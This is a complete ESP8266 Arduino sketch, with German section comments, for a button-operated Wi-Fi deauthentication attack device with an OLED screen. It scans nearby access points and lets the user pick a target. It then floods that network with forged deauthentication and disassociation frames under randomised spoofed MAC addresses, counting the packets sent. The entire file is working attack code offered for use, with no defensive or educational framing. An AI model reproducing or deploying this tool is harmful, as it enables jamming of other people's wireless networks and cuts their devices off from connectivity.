// Inkludierte Bibliotheken
#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>

extern "C" {
  #include "user_interface.h"
}

// --- KONFIGURATION & PINS ---
#define OLED_SDA D2
#define OLED_SCL D1
#define I2C_ADDRESS 0x3C
#define BUTTON_NEXT_PIN D3 // Button to cycle through targets / stop attack
#define BUTTON_ATTACK_PIN D4 // Button to select a target and start the attack

// --- OBJEKTE ---
Adafruit_SH1106G display = Adafruit_SH1106G(128, 64, &Wire, -1);

// --- Packet Structures ---
uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
};
uint8_t disassocPacket[] = {
    0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
};

// --- Globale Variablen & Zustandsmaschine ---
enum State { STATE_SCANNING, STATE_SELECT, STATE_ATTACK };
State currentState = STATE_SCANNING;

struct Target {
  String ssid; String bssid_str; uint8_t bssid[6]; int channel; int rssi;
};
Target* targets;
int num_networks = 0;
int selected_target_index = 0;
int scroll_index = 0; // For the display list
uint8_t randomMac[6];
unsigned long packet_counter = 0;

// --- Funktions-Prototypen ---
void displayMessage(String line1, String line2 = "");
void handleSelection();
void runAttack();
void displaySelectionScreen();
void displayAttackScreen(const Target& target);
void randomizeMac();
void sendPacket(uint8_t* packet, uint8_t* src, uint8_t* dest);
String macToString(uint8_t* mac);

// ===================================================================
// SETUP
// ===================================================================
void setup() {
    pinMode(BUTTON_NEXT_PIN, INPUT_PULLUP);
    pinMode(BUTTON_ATTACK_PIN, INPUT_PULLUP);
    
    randomSeed(analogRead(0));
    display.begin(I2C_ADDRESS, true);
    display.setRotation(2);

    displayMessage("SCANNING...", "Please wait");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    num_networks = WiFi.scanNetworks();
    
    targets = new Target[num_networks];
    for (int i = 0; i < num_networks; i++) {
        targets[i].ssid = WiFi.SSID(i);
        targets[i].bssid_str = WiFi.BSSIDstr(i);
        memcpy(targets[i].bssid, WiFi.BSSID(i), 6);
        targets[i].channel = WiFi.channel(i);
        targets[i].rssi = WiFi.RSSI(i);
    }
    
    currentState = STATE_SELECT; // Transition to selection mode
}

// ===================================================================
// LOOP (State Machine)
// ===================================================================
void loop() {
    switch (currentState) {
        case STATE_SELECT:
            handleSelection();
            break;
        case STATE_ATTACK:
            runAttack();
            break;
    }
}

// ===================================================================
// STATE & LOGIC HANDLERS
// ===================================================================

void handleSelection() {
    if (num_networks == 0) {
        displayMessage("No networks found.", "Please restart.");
        while(true) delay(1000);
    }

    // Handle NEXT button press
    if (digitalRead(BUTTON_NEXT_PIN) == LOW) {
        selected_target_index++;
        if (selected_target_index >= num_networks) {
            selected_target_index = 0;
        }
        delay(200); // Debounce
    }

    // Handle ATTACK button press
    if (digitalRead(BUTTON_ATTACK_PIN) == LOW) {
        packet_counter = 0; // Reset counter
        currentState = STATE_ATTACK;
        wifi_set_channel(targets[selected_target_index].channel); // Set channel once
        delay(200); // Debounce
    }
    
    displaySelectionScreen();
}

void runAttack() {
    // Handle STOP button press
    if (digitalRead(BUTTON_NEXT_PIN) == LOW) {
        currentState = STATE_SELECT;
        delay(200); // Debounce
        return; // Exit the function to stop the attack immediately
    }

    Target current_target = targets[selected_target_index];
    randomizeMac(); // Spoof a new MAC for each burst
    
    // Bidirectional Attack
    sendPacket(deauthPacket, current_target.bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
    sendPacket(disassocPacket, current_target.bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
    sendPacket(deauthPacket, randomMac, current_target.bssid);
    sendPacket(disassocPacket, randomMac, current_target.bssid);
    
    packet_counter += 4; // We sent 4 packets
    displayAttackScreen(current_target);
    delay(2);
}

// ===================================================================
// DISPLAY & HELPER FUNCTIONS
// ===================================================================

void displaySelectionScreen() {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(0, 0);
    display.print("SELECT TARGET (D3:Next D4:Atk)");
    display.drawLine(0, 10, 128, 10, SH110X_WHITE);

    // This logic ensures the selected item is always visible on screen
    int lines_on_screen = 6;
    if (selected_target_index < scroll_index) {
        scroll_index = selected_target_index;
    }
    if (selected_target_index >= scroll_index + lines_on_screen) {
        scroll_index = selected_target_index - lines_on_screen + 1;
    }

    for (int i = 0; i < lines_on_screen && (i + scroll_index) < num_networks; i++) {
        int current_index = i + scroll_index;
        display.setCursor(0, 12 + i * 9);
        if (current_index == selected_target_index) {
            display.print("> ");
        } else {
            display.print("  ");
        }
        String line = String(targets[current_index].rssi) + " " + targets[current_index].ssid;
        display.print(line.substring(0, 19));
    }
    display.display();
}

void displayAttackScreen(const Target& target) {
    display.clearDisplay();
    display.setTextSize(0.5);
    display.setTextColor(SH110X_WHITE);
    
    display.setCursor(0, 0);
    display.print("ATTACKING (D3: Stop)");
    display.drawLine(0, 10, 128, 10, SH110X_WHITE);
    
    display.setCursor(0, 14);
    display.print("TRG: " + target.ssid.substring(0, 13));
    display.setCursor(0, 24);
    display.print("BSD:  " + target.bssid_str);
    display.setCursor(0, 34);
    //display.print("CH:" + String(target.channel) + " SP:" + macToString(randomMac));
    display.print("SP:" + macToString(randomMac));
    
    // Live packet counter
    display.setCursor(0, 48);
    display.setTextSize(1);
    display.print(packet_counter);
    display.setTextSize(1);
    display.print(" pk");
    
    display.display();
}

void sendPacket(uint8_t* packet, uint8_t* src, uint8_t* dest) {
    memcpy(&packet[4], dest, 6);
    memcpy(&packet[10], src, 6);
    memcpy(&packet[16], src, 6); 
    wifi_send_pkt_freedom(packet, 26, 0);
}

void randomizeMac() {
    for (int i = 0; i < 6; i++) randomMac[i] = random(0, 256);
}

String macToString(uint8_t* mac) {
    char buf[20];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

void displayMessage(String line1, String line2) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(0, 20);
    display.println(line1);
    display.setCursor(0, 30);
    display.println(line2);
    display.display();
}
